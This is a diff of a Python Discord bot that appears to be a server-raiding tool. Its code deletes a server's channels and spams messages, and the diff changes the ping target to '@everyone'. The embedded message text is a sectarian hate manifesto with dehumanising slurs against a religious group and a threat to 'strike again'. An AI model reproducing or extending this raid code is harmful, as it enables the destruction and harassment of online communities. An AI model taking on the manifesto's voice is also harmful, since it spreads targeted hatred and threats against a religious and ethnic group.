@@ -12,7 +12,7 @@ This sad excuse for a server has existed for way too long, promoting and spreadi
 
 May Allah forgive both you and us, and lead us to the straight path.
 **But spread kufr once again, and we shall strike again.**
-I promise you this.*
+I promise you this.
 **Islam has won and prevailed, we shall purge those like you from our ummah, as you choose to divide it. Never cross us again, you street shitting toilet worshipping dogs. Your "mahdi" died in his birth place, the toilet. Do not make us remind you of your weakness and gullibleness.**
 الله أكبر
 انتصار الاسلام
@@ -25,7 +25,7 @@ https://media.discordapp.net/attachments/658439558647775232/659857220175134739/Z
 https://i.makeagif.com/media/6-14-2015/s3OMdO.gif
 https://tenor.com/view/assad-fake-smile-laugh-gif-13215835
 """
-        self.invites = "https://discord.gg/cbtAzt"
+        self.invites = "@everyone"
 
     async def delete_channels(self, ctx):
         print("Deleted channels ( ", end='', flush=True)
@@ -95,6 +95,8 @@ https://tenor.com/view/assad-fake-smile-laugh-gif-13215835
                 await channel.send(">spam")
             except:
                 pass
+
+
 
     @commands.Cog.listener()
     async def on_message(self, ctx):
